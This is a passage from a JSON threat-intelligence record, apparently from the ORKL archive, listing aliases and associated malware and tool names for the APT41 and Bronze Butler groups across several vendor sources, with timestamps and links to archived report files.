                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c7d9878a-e691-4c6f-81ae-84fb115a1345",
            "created_at": "2022-10-25T16:07:23.359506Z",
            "updated_at": "2025-03-27T02:02:09.752427Z",
            "deleted_at": null,
            "main_name": "APT 41",
            "aliases": [
                "BrazenBamboo",
                "Bronze Atlas",
                "Double Dragon",
                "Earth Baku",
                "Grayfly",
                "Operation ColunmTK",
                "Operation CuckooBees",
                "Operation ShadowHammer",
                "Red Kelpie",
                "SparklingGoblin",
                "TA415",
                "TG-2633"
            ],
            "source_name": "ETDA:APT 41",
            "tools": [
                "9002 RAT",
                "ADORE.XSEC",
                "ASPXSpy",
                "ASPXTool",
                "AceHash",
                "Agent.dhwf",
                "Agentemis",
                "AndroidControl",
                "AngryRebel",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BLUEBEAM",
                "Barlaiy",
                "BlackCoffee",
                "Bladabindi",
                "BleDoor",
                "CCleaner Backdoor",
                "CHINACHOPPER",
                "COLDJAVA",
                "China Chopper",
                "ChyNode",
                "Cobalt Strike",
                "CobaltStrike",
                "Crackshot",
                "CrossWalk",
                "CurveLast",
                "CurveLoad",
                "DAYJOB",
                "DBoxAgent",
                "DEADEYE",
                "DEADEYE.APPEND",
                "DEADEYE.EMBED",
                "DEPLOYLOG",
                "DIRTCLEANER",
                "DUSTTRAP",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "DodgeBox",
                "DragonEgg",
                "ELFSHELF",
                "EasyNight",
                "Farfli",
                "FunnySwitch",
                "Gh0st RAT",
                "Ghost RAT",
                "HDD Rootkit",
                "HDRoot",
                "HKDOOR",
                "HOMEUNIX",
                "HUI Loader",
                "HidraQ",
                "HighNoon",
                "HighNote",
                "Homux",
                "Hydraq",
                "Jorik",
                "Jumpall",
                "KEYPLUG",
                "Kaba",
                "Korplug",
                "LATELUNCH",
                "LOLBAS",
                "LOLBins",
                "LightSpy",
                "Living off the Land",
                "Lowkey",
                "McRAT",
                "MdmBot",
                "MessageTap",
                "Meterpreter",
                "Mimikatz",
                "MoonBounce",
                "MoonWalk",
                "Motnug",
                "Moudour",
                "Mydoor",
                "NTDSDump",
                "PACMAN",
                "PCRat",
                "PINEGROVE",
                "PNGRAT",
                "POISONPLUG",
                "POISONPLUG.SHADOW",
                "POTROAST",
                "PRIVATELOG",
                "PipeMon",
                "PlugX",
                "PortReuse",
                "ProxIP",
                "ROCKBOOT",
                "RbDoor",
                "RedDelta",
                "RedXOR",
                "RibDoor",
                "Roarur",
                "RouterGod",
                "SAGEHIRE",
                "SPARKLOG",
                "SQLULDR2",
                "STASHLOG",
                "SWEETCANDLE",
                "ScrambleCross",
                "Sensocode",
                "SerialVlogger",
                "ShadowHammer",
                "ShadowPad Winnti",
                "SinoChopper",
                "Skip-2.0",
                "SneakCross",
                "Sogu",
                "Speculoos",
                "Spyder",
                "StealthReacher",
                "StealthVector",
                "TERA",
                "TIDYELF",
                "TIGERPLUG",
                "TOMMYGUN",
                "TVT",
                "Thoper",
                "Voldemort",
                "WIDETONE",
                "WINNKIT",
                "WINTERLOVE",
                "Winnti",
                "WyrmSpy",
                "X-Door",
                "XDOOR",
                "XMRig",
                "XShellGhost",
                "Xamtrav",
                "ZXShell",
                "ZoxPNG",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "gresim",
                "njRAT",
                "pwdump",
                "xDll"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041777,
    "ts_creation_date": 1646937575,
    "ts_modification_date": 1646937575,
    "files": {
        "pdf": "https://archive.orkl.eu/4625a11ec7fb6b97ac5e4882aec5c1a143483bef.pdf",
        "text": "https://archive.orkl.eu/4625a11ec7fb6b97ac5e4882aec5c1a143483bef.txt",
        "img": "https://archive.orkl.eu/4625a11ec7fb6b97ac5e4882aec5c1a143483bef.jpg"
    }
}